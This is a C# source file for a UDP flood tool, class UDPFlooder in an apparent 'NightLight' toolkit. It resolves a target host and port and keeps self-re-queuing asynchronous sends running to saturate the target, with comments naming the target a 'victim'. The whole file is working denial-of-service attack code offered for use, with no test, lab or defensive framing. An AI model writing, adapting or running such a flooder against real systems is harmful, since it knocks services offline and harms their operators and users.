using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace NightLight.UDP
{
    class UDPFlooder : ITool
    {
        #region Fields
        /// <summary>
        /// The connection to the target
        /// </summary>
        private Socket connection;

        /// <summary>
        /// The data that shall be sent to the connection via the UDP protocoll
        /// </summary>
        private byte[] data;

        /// <summary>
        /// The amount of bytes that has been sent to the connection
        /// </summary>
        private uint bytesSent;

        /// <summary>
        /// Holds information about who we shall connect to
        /// </summary>
        private IPEndPoint target;

        /// <summary>
        /// Keeps track of when we started the attack
        /// </summary>
        private DateTime executionStart;

        /// <summary>
        /// Holds the amount of ms the flood can stay
        /// </summary>
        private int timeOut;

        /// <summary>
        /// Amount of connections thats connected when the user starts the tool
        /// </summary>
        private int initializingConnections;

        /// <summary>
        /// Holds a boolean on wether the tool has stopped or not
        /// </summary>
        private bool hasStopped;
        #endregion

        #region Return values
        /// <summary>
        /// Returns how many ms the attack has been running
        /// </summary>
        private int ExecutionTime
        {
            get
            {
                return (int)(DateTime.Now - executionStart).TotalMilliseconds;
            }
        }

        /// <summary>
        /// Returns a boolean on wether the tool has been running over the total life-time (RIP :()
        /// </summary>
        public bool IsTimedOut
        {
            get
            {
                return ExecutionTime > timeOut;
            }
        }
        #endregion

        #region Constructor
        /// <summary>
        /// Initializes the UDP flooder class
        /// </summary>
        public UDPFlooder()
        {
            this.connection = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            this.data = new byte[]{ 0x1, 0x0, 0x1, 0x2, 0x1, 0x0, 0x1, 0x2 };
            this.bytesSent = 0;
            this.hasStopped = false;
        }
        #endregion

        #region Methods
        /// <summary>
        /// Initializes the UDP flood
        /// </summary>
        /// <param name="target">Who we shall attack</param>
        /// <param name="port">Victims port</param>
        /// <param name="initializingConnections">Amount of connections that shall be connection at start</param>
        /// <param name="timeout">Timeout of the tool in ms</param>
        public void Init(string target, int port, int initializingConnections, int timeout)
        {
            IPHostEntry entry = Dns.GetHostEntry(target);
            this.target = new IPEndPoint(entry.AddressList[entry.AddressList.Length - 1], port);
            this.initializingConnections = initializingConnections;
            this.timeOut = timeout;
        }

        /// <summary>
        /// Starts the UDP flood attack
        /// </summary>
        public void Start()
        {
            this.executionStart = DateTime.Now;
            for (int i = 0; i < initializingConnections; i++)
            {
                SendPacket();
            }
        }

        /// <summary>
        /// Sends a call to the .NET thread pool to send the data byte-array to our target
        /// </summary>
        private void SendPacket()
        {
            if (hasStopped)
                return;
            try
            {
                connection.BeginSendTo(data, 0, data.Length, SocketFlags.None, target, OnDataSent, connection);
            }
            catch { }
        }

        /// <summary>
        /// Is called when the data has been sent to the connection
        /// </summary>
        /// <param name="iAr">The IAsync object that contains connection information </param>
        private void OnDataSent(IAsyncResult iAr)
        {
            try
            {
                Socket connection = (Socket)iAr.AsyncState;
                bytesSent += (uint)connection.EndSendTo(iAr);
            }
            catch { }
            finally
            {
                SendPacket();
            }
        }

        /// <summary>
        /// Gets the status of the code
        /// </summary>
        /// <returns>Returns a status message to the console of how we are doing on the attack</returns>
        public string GetStatus()
        {
            StringBuilder status = new StringBuilder();
            status.AppendLine(string.Format("Bytes sent: {0} bytes", bytesSent));
            status.AppendLine(string.Format("Total runtime: {0} ms", ExecutionTime));

            return status.ToString();
        }

        /// <summary>
        /// Aborts the runtime of the program
        /// </summary>
        public void Abort()
        {
            this.hasStopped = true;
        }
        #endregion

    }
}
